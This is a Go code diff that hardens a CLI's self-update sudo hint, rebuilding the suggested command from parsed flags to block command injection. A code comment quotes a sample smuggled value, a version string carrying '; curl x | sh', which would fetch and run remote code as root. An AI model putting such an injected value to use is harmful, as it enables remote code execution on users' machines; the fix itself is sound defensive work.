@@ -107,7 +107,8 @@ Note: `+"`anchored update <id>`"+` updates a MEMORY, not the binary.
 	// pulling several MB is pure waste, and the message the user needs is the
 	// same either way.
 	if err := ensureWritable(res.BinPath); err != nil {
-		fmt.Fprintf(os.Stderr, "anchored self-update: %v\n\nTry: %s\n", err, sudoHint(os.Args))
+		hint := sudoHint(res.BinPath, selfUpdateFlags(*force, *assumeYes, *noPlugin, *target))
+		fmt.Fprintf(os.Stderr, "anchored self-update: %v\n\nTry: %s\n", err, hint)
 		os.Exit(1)
 	}
 
@@ -330,10 +331,38 @@ func ensureWritable(path string) error {
 	return nil
 }
 
-// sudoHint echoes back the invocation the user typed, prefixed with sudo, so
-// the suggestion never drifts out of date as flags are added.
-func sudoHint(argv []string) string {
-	return "sudo " + strings.Join(argv, " ")
+// sudoHint builds the command to retry with privileges.
+//
+// SECURITY INVARIANT: this string is printed for the user to paste into a
+// root shell, at the moment a permission error has them least inclined to
+// read it. It is therefore rebuilt from the parsed flags rather than echoed
+// from os.Args — an unquoted argv would let `--version "0.1.0; curl x | sh"`
+// render as two commands, the second running as root. Only the binary path
+// and the flags this command defines can reach it.
+func sudoHint(binPath string, flags []string) string {
+	parts := append([]string{"sudo", binPath, "self-update"}, flags...)
+	return strings.Join(parts, " ")
+}
+
+// selfUpdateFlags reconstructs the flag list for the sudo hint from parsed
+// values, so nothing the user typed is echoed verbatim.
+func selfUpdateFlags(force, assumeYes, noPlugin bool, target string) []string {
+	var out []string
+	if force {
+		out = append(out, "--force")
+	}
+	if assumeYes {
+		out = append(out, "--yes")
+	}
+	if noPlugin {
+		out = append(out, "--no-plugin")
+	}
+	// The value is validated as a version before it can reach the network,
+	// so it is safe to echo; rendering it keeps the hint runnable.
+	if target != "" {
+		out = append(out, "--version", target)
+	}
+	return out
 }
 
 func renderSelfUpdateInstalled(res updater.Result) string {
